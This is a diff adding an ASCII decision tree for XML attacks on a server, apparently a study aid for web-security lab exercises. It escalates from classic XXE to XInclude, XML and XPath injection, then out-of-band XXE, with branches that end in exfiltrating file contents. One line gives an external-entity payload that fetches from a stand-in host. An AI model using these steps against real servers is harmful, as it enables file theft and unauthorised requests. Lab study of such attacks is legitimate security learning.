@@ -1,0 +1,28 @@
+Start → Can you send XML to the server? (Content-Type: application/xml)
+ │
+ ├─ No → Switch to form-encoded POST parameters (application/x-www-form-urlencoded)
+ │
+ └─ Yes → Try Classic XXE <!DOCTYPE> payload
+       │
+       ├─ Works? → Success, exfiltrate data
+       │
+       └─ Fails (blocked / parser disables DTD) → Try XInclude
+             │
+             ├─ Works? → Success, exfiltrate file content
+             │
+             └─ Fails → Try XML parameter-based injection
+                   │
+                   ├─ Server expects specific root element / tag? 
+                   │      → Copy structure from normal request or lab page
+                   │
+                   └─ Try XPath injection / XML element text injection
+                         │
+                         ├─ Works? → Success
+                         │
+                         └─ Fails → Try OOB XXE / external entity fetch
+                               │
+                               ├─ Server allows HTTP(S) requests? 
+                               │      → Include remote entity like:
+                               │        <!ENTITY xxe SYSTEM "http://your-server.com/test.txt">
+                               │
+                               └─ Server blocks everything → Lab may only accept specific XInclude format
